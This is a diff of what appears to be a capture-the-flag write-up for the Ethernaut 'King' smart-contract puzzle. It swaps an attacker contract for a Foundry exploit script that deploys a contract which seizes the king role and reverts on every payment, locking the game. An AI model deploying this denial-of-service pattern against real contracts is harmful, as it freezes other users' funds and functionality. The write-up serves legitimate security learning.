@@ -26,24 +26,37 @@ You must deploy an "Indestructible King" contract that becomes the king but lack
 
 ---
 
-**Attacker Contract (Solidity):**
+**Exploit Script (Foundry):**
 
 <pre class="plain-code"><code>
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.30;
 
-contract KingAttacker {
-    constructor() {}
+import "forge-std/Script.sol";
 
-    function attack(address payable _target) public payable {
-        // Send enough ether to become the king
-        (bool success, ) = _target.call{value: msg.value}("");
-        require(success, "Attack failed");
+contract KingLock {
+    constructor(address payable _king) payable {
+        (bool ok, ) = _king.call{value: msg.value}("");
+        require(ok, "become king failed");
     }
-
-    // By NOT including a receive() or fallback() function, 
-    // this contract will reject any plain Ether transfers.
+    receive() external payable {
+        revert("I will not accept payment");
+    }
 }
+
+contract ExploitKingInstance is Script {
+    function run() external {
+        address instance = vm.envAddress("INSTANCE_ADDR");
+        uint256 pk = vm.envUint("PRIVATE_KEY");
+        vm.startBroadcast(pk);
+
+        // Deploy KingLock and send 0.002 ether to become king on the instance
+        new KingLock{value: 0.002 ether}(payable(instance));
+
+        vm.stopBroadcast();
+    }
+}
+
 </code></pre>
 
 ---
